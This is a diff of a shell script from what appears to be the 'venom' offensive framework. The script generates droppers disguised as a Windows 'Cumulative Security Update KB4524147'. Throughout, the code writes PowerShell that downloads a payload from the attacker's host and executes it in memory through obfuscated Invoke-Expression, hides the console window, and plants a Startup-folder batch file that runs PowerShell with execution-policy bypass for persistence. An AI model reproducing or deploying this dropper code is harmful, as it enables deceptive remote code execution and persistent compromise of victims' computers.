@@ -12054,8 +12054,10 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
    echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
    echo "#>" >> $IPATH/output/$Drop.ps1
    echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
-   echo "write-Host \"Please Be Patience While We Search For Available Updates to \$env:computername System ..\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
-   echo "   Get-HotFix -Description 'Security Update';\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
+   echo "write-Host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System ..\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
+   echo "  \$Kbid=Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
+   echo "  \$KBid;\$KBid | Out-File -Encoding utf8 -FilePath 'Recent_OS_Updates.txt' -Force;" >> $IPATH/output/$Drop.ps1
+   echo "     \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
    echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
    echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
    ## Obfuscated IEX (Invoke-Expression) API call (in PS console)
@@ -12063,14 +12065,14 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
 else
    ## Hidde powershell execution terminal windows
    # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the REAL dropper (KB4524147_4nF7.ps1)
-   # then execute it in a PS hidden console (to download/exec payload.ps1 in ram) <-- need testing (BETA) ..
+   # then execute it in a PS hidden console (to download/exec payload.ps1 in ram)..
    echo "<#" > $IPATH/output/$Drop.ps1
    echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
    echo "#>" >> $IPATH/output/$Drop.ps1
    echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
    echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
-   echo "\$KBid=Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
-   echo "\$KBid;\$KBid | Out-File -Encoding utf8 -FilePath 'Recent_OS_Updates.txt' -Force;" >> $IPATH/output/$Drop.ps1
+   echo "  \$KBid=Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
+   echo "  \$KBid;\$KBid | Out-File -Encoding utf8 -FilePath 'Recent_OS_Updates.txt' -Force;" >> $IPATH/output/$Drop.ps1
    echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
@@ -12506,7 +12508,7 @@ else
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo PoWeRsHeLl Get-HotFix >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo PoWeRsHeLl Get-HotFix -Description 'Security Update' >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    fi
